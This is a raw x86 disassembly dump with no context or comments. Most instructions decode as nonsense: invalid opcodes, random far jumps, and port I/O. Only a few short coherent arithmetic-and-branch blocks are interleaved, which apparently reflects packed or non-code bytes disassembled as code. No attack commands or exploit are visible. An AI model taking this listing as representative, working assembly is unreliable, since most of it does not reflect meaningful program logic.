  4115cb:	aad    0x22
  4115cd:	shl    DWORD PTR [ecx-0x1],1
  4115d0:	rol    BYTE PTR [eax],1
  4115d2:	popf   
  4115d3:	stc    
  4115d4:	adc    eax,0xf1b68cc1
  4115d9:	add    BYTE PTR [esi],bh
  4115db:	mov    bl,0x5a
  4115dd:	js     0x41158b
  4115df:	sbb    eax,0x2c92a345
  4115e4:	fst    QWORD PTR [edx+0x1293a302]
  4115ea:	cwde   
  4115eb:	push   ebp
  4115ec:	cmp    BYTE PTR [ebp+0x5a0c4552],dh
  4115f2:	pop    ss
  4115f3:	push   ss
  4115f4:	sub    dh,BYTE PTR [edi-0x4c]
  4115f7:	loop   0x4115b2
  4115f9:	jo     0x411645
  4115fb:	inc    ebp
  4115fc:	sub    edx,DWORD PTR [eax+0x343a719b]
  411602:	mov    ds:0x6eceb344,al
  411607:	aam    0x65
  411609:	neg    dh
  41160b:	adc    al,0xa9
  41160d:	dec    ebp
  41160e:	shl    edx,cl
  411610:	jmp    0x5dc553b4
  411615:	stc    
  411616:	(bad)  
  411617:	adc    eax,0x2556cc6b
  41161c:	push   eax
  41161d:	jmp    0x8eff:0x58261cff
  411624:	pop    esi
  411625:	shl    DWORD PTR [edi+0x50],cl
  411628:	lods   al,BYTE PTR ds:[esi]
  411629:	ins    BYTE PTR es:[edi],dx
  41162a:	lea    esi,ds:0x834a49ec
  411630:	das    
  411631:	cld    
  411632:	jp     0x4116b0
  411634:	mov    dl,0x69
  411636:	add    eax,0xeaa93100
  41163b:	push   esi
  41163c:	popa   
  41163d:	sub    eax,DWORD PTR [edx]
  41163f:	sub    al,BYTE PTR [esi+ecx*8-0x37b8d92f]
  411646:	ret    0x1abf
  411649:	ficomp DWORD PTR [edx+0x71]
  41164c:	loop   0x4115e2
  41164e:	jae    0x4115f0
  411650:	test   eax,0x21a8e62f
  411655:	push   ebp
  411656:	paddq  mm1,QWORD PTR [edx]
  411659:	out    dx,al
  41165a:	ja     0x411610
  41165c:	inc    ebx
  41165d:	push   ebp
  41165e:	repz (bad) 
  411660:	xlat   BYTE PTR ds:[ebx]
  411661:	fdiv   DWORD PTR [eax+0x55]
  411664:	sbb    BYTE PTR [edx-0x53],0xf6
  411668:	or     DWORD PTR [esi-0x6d18abab],eax
  41166e:	xor    al,0x59
  411670:	dec    ebx
  411671:	ds xchg ch,ch
  411674:	sbb    eax,0x76e5247a
  411679:	or     bh,BYTE PTR [edx]
  41167b:	cmp    ebx,ebx
  41167d:	(bad)  
  41167e:	iret   
  41167f:	sub    bh,BYTE PTR [ebx-0x66]
  411682:	mov    al,BYTE PTR [ebp-0x635b430a]
  411688:	pop    ebp
  411689:	cmc    
  41168a:	les    ebp,FWORD PTR [ebx-0x1665b39a]
  411690:	dec    ebx
  411691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411692:	clc    
  411693:	sub    dl,BYTE PTR [ebp-0x5]
  411696:	repz test DWORD PTR [ebp*8+0x25e94f5e],esp
  41169e:	cld    
  41169f:	inc    ebp
  4116a0:	sub    BYTE PTR [ebp+0x57],bh
  4116a3:	inc    edx
  4116a4:	cmp    DWORD PTR [edi-0x66],0x66
  4116a8:	xor    ebp,ebp
  4116aa:	in     al,0x68
  4116ac:	fnstcw WORD PTR [eax+ecx*4+0x6c]
  4116b0:	and    bh,BYTE PTR [ecx]
  4116b2:	push   ss
  4116b3:	pusha  
  4116b4:	lods   eax,DWORD PTR ds:[esi]
  4116b5:	out    0x8e,eax
  4116b7:	mov    ebx,ecx
  4116b9:	xor    ebp,DWORD PTR ds:0xee4fa695
  4116bf:	cs jnp 0x41170c
  4116c2:	lds    ebx,FWORD PTR [ecx-0x62]
  4116c5:	jmp    0x9005:0xd0762303
  4116cc:	or     al,0xe7
  4116ce:	test   eax,0x377b68d7
  4116d3:	call   0xb19d36dd
  4116d8:	pop    eax
  4116d9:	dec    eax
  4116da:	or     BYTE PTR [ebx+0x67],cl
  4116dd:	xor    DWORD PTR [edx-0x8515669],ecx
  4116e3:	test   eax,0xdd7e00a0
  4116e8:	pusha  
  4116e9:	add    cl,0x1e
  4116ec:	mov    cl,0x84
  4116ee:	imul   ebx,esi,0x52
  4116f1:	jmp    0x13fd:0xc55c4708
  4116f8:	fwait
  4116f9:	push   esi
  4116fa:	fistp  QWORD PTR [esi]
  4116fc:	mov    ah,0x23
  4116fe:	dec    edi
  4116ff:	push   0xffffff90
  411701:	mov    ebx,eax
  411703:	add    DWORD PTR [edx+ecx*1+0x1ab1bc3c],0x56
  41170b:	adc    BYTE PTR [esi],ah
  41170d:	das    
  41170e:	fiadd  WORD PTR [ebx-0x43c299a]
  411714:	xchg   BYTE PTR [ebp-0x69304b49],bl
  41171a:	repz inc esi
  41171c:	mov    al,ds:0x23b306d2
  411721:	test   bl,bh
  411723:	pop    eax
  411724:	jnp    0x41171f
  411726:	mov    ah,0x13
  411728:	push   ebp
  411729:	pop    ecx
  41172a:	and    BYTE PTR [edx],dh
  41172c:	xchg   ecx,eax
  41172d:	or     al,BYTE PTR [eax-0x13ed84cd]
  411733:	and    edi,DWORD PTR [ebx-0x31]
  411736:	jne    0x4117a8
  411738:	cdq    
  411739:	mov    eax,0xf8df9e93
  41173e:	cmp    DWORD PTR [esi+0x6cbd3fc4],ebp
  411744:	ror    DWORD PTR [ebp-0x7cb35e42],0x37
  41174b:	mov    eax,gs
  41174d:	lock (bad) 
  411750:	fisttp DWORD PTR [eax-0x114c4f27]
  411756:	(bad)  
  411757:	mov    BYTE PTR [ebx+0x12119742],ch
  41175d:	int    0xf
  41175f:	pop    esi
  411760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411761:	jl     0x411710
  411763:	(bad)  
  411764:	out    0x9c,al
  411766:	pusha  
  411767:	in     eax,0xfa
  411769:	cmp    ah,BYTE PTR [ebx]
  41176b:	inc    esi
  41176c:	pop    ss
  41176d:	push   eax
  41176e:	imul   ebx,eax,0xf29837b5
  411774:	repz out 0x7,eax
  411777:	mov    bh,dl
  411779:	mov    WORD PTR [edi-0x40],fs
  41177c:	mov    al,ds:0xb3dd5da8
  411781:	nop
  411782:	adc    eax,0x8b8a3f35
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	jmp    0x250c5244
  4117b8:	bound  edi,QWORD PTR [eax+0x78]
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	and    DWORD PTR [eax],ecx
  4117c1:	mov    bl,al
  4117c3:	adc    bh,BYTE PTR [edx]
  4117c5:	jle    0x411834
  4117c7:	and    ch,bh
  4117c9:	sbb    al,0xe7
  4117cb:	sbb    DWORD PTR [esi-0x3ba030d4],eax
  4117d1:	jge    0x411791
  4117d3:	scas   al,BYTE PTR es:[edi]
  4117d4:	add    ch,BYTE PTR [edx]
  4117d6:	cmp    al,0x37
  4117d8:	sbb    eax,0x96e6fcc6
  4117dd:	gs fwait
  4117df:	mov    al,0xf8
  4117e1:	sub    BYTE PTR [eax+0x9506f0c],0x5e
  4117e8:	out    dx,al
  4117e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ea:	cli    
  4117eb:	dec    ah
  4117ed:	out    dx,al
  4117ee:	out    dx,al
  4117ef:	ins    BYTE PTR es:[edi],dx
  4117f0:	mov    dl,0xea
  4117f2:	xchg   BYTE PTR [edx],ah
  4117f4:	sub    al,0x0
  4117f6:	ret    
  4117f7:	and    cl,ah
  4117f9:	cmp    dl,BYTE PTR [ebp-0x321e371e]
  4117ff:	mov    al,0x9d
  411801:	push   ebp
  411802:	sbb    DWORD PTR [edx-0x1da8785c],0x67938eb9
  41180c:	sbb    bl,BYTE PTR [eax+ecx*1-0x6f]
  411810:	imul   ebp,DWORD PTR [eax],0x78
  411813:	mov    BYTE PTR [edx+0x6e],ch
  411816:	xor    edx,0x39
  411819:	std    
  41181a:	in     al,dx
  41181b:	dec    esi
  41181c:	das    
  41181d:	int3   
  41181e:	(bad)  
  41181f:	in     al,dx
  411820:	rcl    eax,0x71
  411823:	xchg   DWORD PTR [esi+0x75],ecx
  411826:	mov    eax,0x7a370df8
  41182b:	clc    
  41182c:	lods   al,BYTE PTR ds:[esi]
  41182d:	clc    
  41182e:	cld    
  41182f:	mov    ebx,0x2f58b1ab
  411834:	cmp    DWORD PTR [esi],ecx
  411836:	daa    
  411837:	in     al,0xd7
  411839:	fsub   st(5),st
  41183b:	shl    DWORD PTR [ebx],0x94
  41183e:	xlat   BYTE PTR ds:[ebx]
  41183f:	push   0xffffffc1
  411841:	jmp    FWORD PTR [edx+0x7792bba8]
  411847:	add    bl,cl
  411849:	lds    ecx,FWORD PTR [edx-0x1d]
  41184c:	mov    al,dh
  41184e:	pop    ss
  41184f:	adc    BYTE PTR [ebx+0x3356178d],0xcc
  411856:	or     edi,DWORD PTR [ebp+ebp*8+0x75c1b8a7]
  41185d:	mov    eax,0xad659dce
  411862:	iret   
  411863:	push   cs
  411864:	lds    esp,FWORD PTR [ecx]
  411866:	jge    0x411816
  411868:	jno    0x411875
  41186a:	push   cs
  41186b:	mov    dl,0xfd
  41186d:	sub    esp,DWORD PTR [edi-0x35229080]
  411873:	scas   eax,DWORD PTR es:[edi]
  411874:	mov    eax,0x30ee07fe
  411879:	jno    0x41182a
  41187b:	pusha  
  41187c:	pop    edx
  41187d:	test   eax,0xca20b1c
  411882:	sub    al,0x3
  411884:	mov    esp,DWORD PTR [ebp+0x7b88f48]
  41188a:	in     eax,dx
  41188b:	pop    ss
  41188c:	push   ss
  41188d:	pop    ecx
  41188e:	push   edi
  41188f:	pop    edx
  411890:	(bad)  
  411891:	je     0x41184e
  411893:	dec    ebx
  411894:	and    ah,dh
  411896:	adc    DWORD PTR [esi+0x2d],edx
  411899:	(bad)  
  41189a:	xlat   BYTE PTR ds:[ebx]
  41189b:	aaa    
  41189c:	rol    esi,cl
  41189e:	call   0x36b54785
  4118a3:	les    edx,FWORD PTR [ebp+ebx*2-0x4]
  4118a7:	test   DWORD PTR [edi-0x7decea6d],ecx
  4118ad:	aaa    
  4118ae:	cmp    eax,0xbf64a2f8
  4118b3:	mov    esp,0xe096f756
  4118b8:	xor    DWORD PTR [edx+0x59],edi
  4118bb:	test   eax,0x1a53985c
  4118c0:	mov    ch,0xf8
  4118c2:	sub    al,0xfa
  4118c4:	outs   dx,DWORD PTR ds:[esi]
  4118c5:	out    dx,eax
  4118c6:	push   edi
  4118c7:	push   ds
  4118c8:	ret    
  4118c9:	jnp    0x411865
  4118cb:	ret    0x2d4
  4118ce:	add    BYTE PTR [ecx],bl
  4118d0:	add    dh,BYTE PTR [esi]
  4118d2:	xor    bl,dl
  4118d4:	mov    bl,0x3f
  4118d6:	pslld  mm7,mm7
  4118d9:	dec    edi
  4118da:	in     al,dx
  4118db:	fadd   DWORD PTR [eax-0x5ee2c8fb]
  4118e1:	jno    0x411907
  4118e3:	repz sbb edx,DWORD PTR [edi+0x6b]
  4118e7:	sub    al,0xc1
  4118e9:	cmc    
  4118ea:	xor    eax,0xd471f447
  4118ef:	xchg   ebp,eax
  4118f0:	xor    al,0xd9
  4118f2:	push   ss
  4118f3:	push   ebx
  4118f4:	and    al,0x22
  4118f6:	push   ss
  4118f7:	and    ebx,esi
  4118f9:	or     edi,DWORD PTR [ecx-0x55589b98]
  4118ff:	sbb    DWORD PTR cs:[ebx+0x6e],ebp
  411903:	sbb    eax,0xdabcf521
  411908:	les    esp,FWORD PTR [ecx+0x770898d8]
  41190e:	and    al,0x27
  411910:	xchg   ch,cl
  411912:	dec    esi
  411913:	(bad)  
  411914:	jl     0x4118d1
  411916:	fnsave [edi-0x44]
  411919:	jno    0x41193f
  41191b:	vdivps xmm1,xmm1,XMMWORD PTR [edx+0x17]
  411920:	ja     0x41198a
  411922:	ins    BYTE PTR es:[edi],dx
  411923:	scas   al,BYTE PTR es:[edi]
  411924:	dec    ecx
  411925:	sti    
  411926:	aad    0x61
  411928:	lods   eax,DWORD PTR ds:[esi]
  411929:	sahf   
  41192a:	mov    dh,0xd6
  41192c:	repnz into 
  41192e:	mov    eax,0x63b49e79
  411933:	mov    ebp,0x566ee5d0
  411938:	hlt    
  411939:	mov    BYTE PTR [esi+edx*8+0x44],dh
  41193d:	sbb    BYTE PTR [edi+0x63cb510],bl
  411943:	xchg   edx,eax
  411944:	in     eax,dx
  411945:	fwait
  411946:	mov    BYTE PTR [eax-0x25],bl
  411949:	mov    esi,DWORD PTR [edi-0x42]
  41194c:	or     ah,BYTE PTR [eax-0x31]
  41194f:	sbb    edi,DWORD PTR [ebp+esi*8-0x38c7d78a]
  411956:	sar    BYTE PTR [edi],1
  411958:	leave  
  411959:	jl     0x4119c2
  41195b:	lods   al,BYTE PTR ds:[esi]
  41195c:	aaa    
  41195d:	in     eax,0xd3
  41195f:	iret   
  411960:	popf   
  411961:	retf   0x357e
  411964:	sub    eax,0x97c462f5
  411969:	sub    al,0xbd
  41196b:	daa    
  41196c:	adc    DWORD PTR gs:[edi],esi
  41196f:	sbb    DWORD PTR [ecx+0x27e17e96],esi
  411975:	jg     0x411947
  411977:	pop    ecx
  411978:	push   ds
  411979:	or     BYTE PTR ss:[edx-0x626a511c],bh
  411980:	inc    esp
  411981:	loopne 0x411972
  411983:	les    ebp,FWORD PTR [edx+ecx*2-0x28f0166b]
  41198a:	dec    eax
  41198b:	hlt    
  41198c:	mov    eax,0x36b0e968
  411991:	and    dh,bl
  411993:	call   0x627be10e
  411998:	std    
  411999:	sub    al,0xe5
  41199b:	mov    eax,ds:0x1cad050b
  4119a0:	push   cs
  4119a1:	mov    cl,cl
  4119a3:	or     al,0xf2
  4119a5:	inc    ebx
  4119a7:	inc    DWORD PTR [ebp+ebx*1-0x17]
  4119ab:	push   ebp
  4119ac:	fstp   TBYTE PTR [ebp+0x77]
  4119af:	loop   0x41196c
  4119b1:	icebp  
  4119b2:	or     al,0x7f
  4119b4:	xor    DWORD PTR [ebx-0x544f0578],edi
  4119ba:	fstp   TBYTE PTR [ecx-0x56]
  4119bd:	sub    BYTE PTR [eax],cl
  4119bf:	lods   eax,DWORD PTR ds:[esi]
  4119c0:	fcom   DWORD PTR [ebx+0x11]
  4119c3:	jle    0x411a22
  4119c5:	fucomp st(5)
  4119c7:	inc    ebx
  4119c8:	dec    edi
  4119c9:	or     al,0xf7
  4119cb:	ins    BYTE PTR es:[edi],dx
  4119cc:	or     dl,BYTE PTR [ebp-0x54]
  4119cf:	jbe    0x411962
  4119d1:	jns    0x411991
  4119d3:	push   ebp
  4119d4:	retf   0x31c
  4119d7:	dec    edx
  4119d8:	and    BYTE PTR [ebp-0x4d],dh
  4119db:	xor    eax,0x5f96ea84
  4119e0:	outs   dx,DWORD PTR ds:[esi]
  4119e1:	inc    esi
  4119e2:	push   esp
  4119e3:	push   ss
  4119e4:	in     al,dx
  4119e5:	push   0xfffffff0
  4119e7:	gs mov cl,0xb4
  4119ea:	arpl   dx,bx
  4119ec:	out    dx,eax
  4119ed:	jnp    0x411a2f
  4119ef:	shl    dh,1
  4119f1:	aam    0x9e
  4119f3:	push   cs
  4119f4:	leave  
  4119f5:	jl     0x411a34
  4119f7:	mov    ecx,0x181d3cd4
  4119fc:	cmp    ah,BYTE PTR [esi-0x32]
  4119ff:	gs mov ch,cl
  411a02:	and    eax,edx
  411a04:	xchg   BYTE PTR [edi+0x5f23bd40],al
  411a0a:	popf   
  411a0b:	mov    WORD PTR [edi+0x40],?
  411a0e:	inc    ebp
  411a0f:	xchg   esi,eax
  411a10:	pop    edx
  411a11:	xor    eax,0x598db82c
  411a16:	jo     0x411a0e
  411a18:	mov    ds:0x7159938f,al
  411a1d:	lahf   
  411a1e:	lahf   
  411a1f:	clc    
  411a20:	in     al,0xc
  411a22:	sar    BYTE PTR [ecx-0x3c],cl
  411a25:	mov    ebx,0xc977fb8
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x61d7da8b
  411a62:	sbb    al,0xe1
  411a64:	mov    bl,0x91
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	sbb    BYTE PTR [ecx+0x3b],0x85
  411a71:	test   eax,0x4c876a9b
  411a76:	hlt    
  411a77:	cli    
  411a78:	adc    ecx,DWORD PTR [edi-0x6555ba0d]
  411a7e:	rol    BYTE PTR [esi+0x6ca2f9c],cl
  411a84:	mov    bl,BYTE PTR [edi+0x54055c3e]
  411a8a:	stos   BYTE PTR es:[edi],al
  411a8b:	(bad)  
  411a8c:	adc    al,0x48
  411a8e:	push   esp
  411a8f:	push   edx
  411a90:	pushf  
  411a91:	and    DWORD PTR [edx],ecx
  411a93:	mov    bl,BYTE PTR cs:[edi+eiz*8+0x29]
  411a98:	mov    cl,0xcb
  411a9a:	xchg   eax,esi
  411a9c:	inc    ebx
  411a9d:	(bad)  
  411a9e:	(bad)  
  411a9f:	jo     0x411a4e
  411aa1:	xchg   esi,eax
  411aa2:	mov    ecx,0x67ed5f5e
  411aa7:	jg     0x411ae7
  411aa9:	dec    edi
  411aaa:	pop    ebp
  411aab:	jbe    0x411af1
  411aad:	xchg   cl,ah
  411aaf:	xchg   DWORD PTR [eax],ecx
  411ab1:	inc    esp
  411ab2:	pop    ecx
  411ab3:	sbb    DWORD PTR [ebp-0x77681216],edx
  411ab9:	mov    ecx,0xb93a0123
  411abe:	pop    esp
  411abf:	call   0xe833:0x7912c9f8
  411ac6:	or     DWORD PTR [edx-0x20],edi
  411ac9:	fstp   QWORD PTR [ecx+0x31]
  411acc:	mov    dl,0x33
  411ace:	out    0xcf,al
  411ad0:	ss daa 
  411ad2:	pusha  
  411ad3:	sbb    DWORD PTR [esp+edx*1-0x2afa717f],edx
  411ada:	(bad)  
  411adb:	hlt    
  411adc:	push   bx
  411ade:	fiadd  WORD PTR [eax+0x76ebd598]
  411ae4:	adc    bl,cl
  411ae6:	(bad)  
  411ae7:	pop    esi
  411ae8:	xor    cl,BYTE PTR [ebx+0x37f91e48]
  411aee:	stos   BYTE PTR es:[edi],al
  411aef:	sbb    ebp,DWORD PTR [ecx+0x2d]
  411af2:	xchg   edx,eax
  411af3:	mov    ds:0xaf31f939,eax
  411af8:	add    ebp,DWORD PTR [eax-0x47fb3ace]
  411afe:	mov    ebp,0x65ec2922
  411b03:	cmp    eax,0x66900966
  411b08:	push   0xdacc4c95
  411b0d:	test   BYTE PTR [edi-0x33],0xe8
  411b11:	shl    BYTE PTR ds:0x500841d0,0x77
  411b18:	or     DWORD PTR [ebx],esi
  411b1a:	jp     0x411ad7
  411b1c:	and    al,0xff
  411b1e:	xlat   BYTE PTR ds:[ebx]
  411b1f:	dec    ecx
  411b20:	mov    bl,0xcd
  411b22:	mov    edi,0xa9ab484e
  411b27:	lahf   
  411b28:	sub    ch,BYTE PTR [ecx-0x50]
  411b2b:	into   
  411b2c:	aas    
  411b2d:	int    0xcc
  411b2f:	ins    DWORD PTR es:[edi],dx
  411b30:	mov    cl,0x39
  411b32:	push   esi
  411b33:	pop    ebx
  411b34:	lods   al,BYTE PTR ds:[esi]
  411b35:	mov    eax,ds:0x6520741c
  411b3a:	popa   
  411b3b:	daa    
  411b3c:	dec    eax
  411b3d:	test   DWORD PTR [ecx-0x1c],ecx
  411b40:	test   BYTE PTR [ebx+esi*4],ah
  411b43:	xor    al,0x11
  411b45:	push   0x9ed15c94
  411b4a:	xchg   cx,ax
  411b4c:	shl    DWORD PTR [ecx-0x6],0xf7
  411b50:	mov    ebx,0x23af51f0
  411b55:	or     BYTE PTR [di+0x775f],ah
  411b5a:	mov    bh,0xc
  411b5c:	ds retf 
  411b5e:	sbb    al,BYTE PTR [ebx+0x65]
  411b61:	lahf   
  411b62:	inc    ebx
  411b63:	retf   
  411b64:	mov    esi,0x45631258
  411b69:	fwait
  411b6a:	pop    es
  411b6b:	(bad)  
  411b6c:	test   DWORD PTR [ebx-0xc4409b2],esp
  411b72:	sub    BYTE PTR [edx+0x4112aa3a],0x19
  411b79:	out    0x6e,al
  411b7b:	inc    ecx
  411b7c:	(bad)
  411b7f:	mov    ch,BYTE PTR [ecx+ebx*2+0x2c3e2abe]
  411b86:	loopne 0x411b21
  411b88:	(bad)  
  411b89:	xor    eax,0x9fae844b
  411b8e:	dec    edi
  411b8f:	pusha  
  411b90:	xchg   esi,eax
  411b91:	mov    bh,0x3e
  411b93:	jno    0x411b24
  411b95:	cld    
  411b96:	(bad)  
  411b98:	nop
  411b99:	(bad)  
  411b9a:	out    0xb,al
  411b9c:	mov    dh,0x79
  411b9e:	xchg   BYTE PTR [edx],dh
  411ba0:	sbb    esp,DWORD PTR [edx]
  411ba2:	mov    al,ds:0x9c59387d
  411ba7:	shl    DWORD PTR [ebp+ecx*1-0x21],1
  411bab:	adc    DWORD PTR [ebp+esi*8+0x5c],ebx
  411baf:	pop    eax
  411bb0:	pop    es
  411bb1:	idiv   ebx
  411bb3:	adc    edi,DWORD PTR [eax-0xb]
  411bb6:	lods   al,BYTE PTR ds:[esi]
  411bb7:	out    0xc6,al
  411bb9:	call   0x2f34:0xad75f3d0
  411bc0:	lods   al,BYTE PTR ds:[esi]
  411bc1:	mov    ebx,0x1957555
  411bc6:	dec    esi
  411bc7:	mov    esi,0x95475313
  411bcc:	iret   
  411bcd:	stos   DWORD PTR es:[edi],eax
  411bce:	aas    
  411bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd0:	push   cs
  411bd1:	jne    0x411baf
  411bd3:	out    dx,al
  411bd4:	adc    edx,DWORD PTR [ebx+0x4a]
  411bd7:	pop    ebp
  411bd8:	mov    ecx,0xa30a6813
  411bdd:	fidivr WORD PTR [ecx+0xac75eb2]
  411be3:	dec    eax
  411be4:	popa   
  411be5:	pop    edi
  411be6:	stos   DWORD PTR es:[edi],eax
  411be7:	cmp    al,0x9d
  411be9:	xchg   edi,eax
  411bea:	leave  
  411beb:	rsm    
  411bed:	shr    BYTE PTR [edx],0x35
  411bf0:	sahf   
  411bf1:	mov    dl,0xf6
  411bf3:	cmp    DWORD PTR [edx+0x38],0x6
  411bf7:	dec    ebp
  411bf8:	pop    edx
  411bf9:	clc    
  411bfa:	xchg   esi,eax
  411bfb:	mov    ecx,0x2ddd9c66
  411c00:	adc    dl,BYTE PTR [ecx+ebx*1]
  411c03:	inc    ebp
  411c04:	xlat   BYTE PTR ds:[ebx]
  411c05:	aaa    
  411c06:	adc    DWORD PTR [eax+0x112518ff],eax
  411c0c:	mov    ch,0x93
  411c0e:	dec    ecx
  411c0f:	outs   dx,BYTE PTR ds:[esi]
  411c10:	cld    
  411c11:	fisttp WORD PTR [edx-0x25]
  411c14:	push   esp
  411c15:	mov    dh,0x73
  411c17:	and    eax,0x17b5a1a5
  411c1c:	add    BYTE PTR [edi],al
  411c1e:	mov    bl,BYTE PTR [ebx+0x72]
  411c21:	pop    ebx
  411c22:	push   edi
  411c23:	xchg   ecx,eax
  411c24:	dec    esp
  411c25:	jne    0x411c64
  411c27:	xor    eax,0x41fe9923
  411c2c:	push   ebx
  411c2d:	scas   eax,DWORD PTR es:[edi]
  411c2e:	sahf   
  411c2f:	test   eax,0x1dcea5c7
  411c34:	adc    dl,0x29
  411c37:	(bad)  
  411c38:	aam    0x85
  411c3a:	xchg   edx,eax
  411c3b:	mov    DWORD PTR [edi+0x47],edi
  411c3e:	xor    DWORD PTR [edi+0x47b0e634],edi
  411c44:	inc    ebx
  411c45:	mov    esi,0x9bfd228d
  411c4a:	call   0xc9e3d3be
  411c4f:	pop    ecx
  411c50:	clc    
  411c51:	mov    dh,0x5e
  411c53:	pop    eax
  411c54:	jmp    0xcb9a:0x991b71ce
  411c5b:	inc    esp
  411c5c:	dec    esi
  411c5d:	mul    DWORD PTR [eax-0x7d6980f5]
  411c63:	cmc    
  411c64:	fiadd  WORD PTR [ebp-0x57]
  411c67:	xor    al,0x78
  411c69:	ja     0x411bfa
  411c6b:	fild   QWORD PTR [edi]
  411c6d:	push   esp
  411c6e:	mov    al,ds:0x2073fe66
  411c73:	mov    ecx,0x5b7a3e98
  411c78:	mov    ecx,DWORD PTR [esi+0x13cbaf4d]
  411c7e:	push   esi
  411c7f:	call   esi
  411c81:	cmp    al,0x82
  411c83:	stos   BYTE PTR es:[edi],al
  411c84:	fxch   st(3)
  411c86:	dec    eax
  411c87:	and    BYTE PTR [ebx],0x93
  411c8a:	(bad)  
  411c8b:	aad    0xc7
  411c8d:	sti    
  411c8e:	test   BYTE PTR [edx],ch
  411c90:	paddw  mm2,mm3
  411c93:	and    eax,DWORD PTR [edx-0x524d5969]
  411c99:	jg     0x411cfa
  411c9b:	(bad)  
  411c9c:	mov    WORD PTR [ecx+ecx*8-0x1c887c63],ds
  411ca3:	ds inc eax
  411ca5:	inc    eax
  411ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ca7:	xlat   BYTE PTR ss:[ebx]
  411ca9:	addr16 call 0xb184:0xca7d431d
  411cb1:	ficomp WORD PTR [edi+esi*8+0x72]
  411cb5:	jo     0x411cf3
  411cb7:	int3   
  411cb8:	sar    DWORD PTR [edi+0x426365f2],0xbc
  411cbf:	shr    bl,1
  411cc1:	sbb    BYTE PTR [edx+0x2a2b9a45],ah
  411cc7:	and    dh,BYTE PTR [ebp+0x65]
  411cca:	clc    
  411ccb:	ja     0x411d38
  411ccd:	mov    bl,0x49
  411ccf:	fcmovbe st,st(4)
  411cd1:	mov    eax,0x26851153
  411cd6:	push   ecx
  411cd7:	pop    edx
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xbf66579e
  411cfd:	pusha  
  411cfe:	in     eax,0xd4
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	lods   al,BYTE PTR ds:[esi]
  411d09:	add    BYTE PTR [ecx],bh
  411d0b:	not    BYTE PTR [edi-0x4c]
  411d0e:	js     0x411d06
  411d10:	or     dl,BYTE PTR [eax+esi*8-0x9]
  411d14:	out    0xbf,al
  411d16:	lds    ebp,FWORD PTR [esi]
  411d18:	pop    ds
  411d19:	ja     0x411d10
  411d1b:	adc    BYTE PTR [ecx+0x7de29f8c],0x3c
  411d22:	test   BYTE PTR [esi-0x1a508a13],0x7c
  411d29:	adc    DWORD PTR [eax],ebx
  411d2b:	lods   eax,DWORD PTR ds:[esi]
  411d2c:	dec    eax
  411d2d:	out    0x25,al
  411d2f:	js     0x411d85
  411d31:	sub    bl,dl
  411d33:	sub    ebp,DWORD PTR [edx-0x41]
  411d36:	xchg   ebx,eax
  411d37:	outs   dx,BYTE PTR ds:[esi]
  411d38:	ret    
  411d39:	dec    edx
  411d3a:	adc    eax,0x6e637595
  411d3f:	xor    edi,esp
  411d41:	mov    edx,0x25663ada
  411d46:	in     eax,0xb3
  411d48:	in     eax,0x73
  411d4a:	sbb    esi,esi
  411d4c:	bound  ebx,QWORD PTR [ebp-0x6be7badc]
  411d52:	add    BYTE PTR [esi],0x9
  411d55:	retf   0x3fef
  411d58:	push   esp
  411d59:	and    edx,ebx
  411d5b:	mov    eax,ds:0x2ba2e033
  411d60:	(bad)
  411d64:	leave  
  411d65:	cmp    ebp,DWORD PTR [edi+0xb]
  411d68:	dec    edx
  411d69:	xchg   BYTE PTR [ecx-0x36],ah
  411d6c:	int3   
  411d6d:	into   
  411d6e:	adc    esp,eax
  411d70:	test   eax,0x3338dc99
  411d75:	adc    bl,bh
  411d77:	sub    al,BYTE PTR [esi-0x69]
  411d7a:	jbe    0x411de7
  411d7c:	adc    eax,0x2cf9292c
  411d81:	fidivr WORD PTR [esi-0x49af6bf1]
  411d87:	inc    esp
  411d88:	mov    ebp,0x680130d
  411d8d:	jecxz  0x411d38
  411d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d90:	xchg   ecx,eax
  411d91:	fidiv  DWORD PTR [edi+edx*8]
  411d94:	sub    bl,BYTE PTR [ebx-0x6e]
  411d97:	das    
  411d98:	sub    esp,DWORD PTR [esi]
  411d9a:	and    ebp,DWORD PTR [edi]
  411d9c:	jae    0x411e19
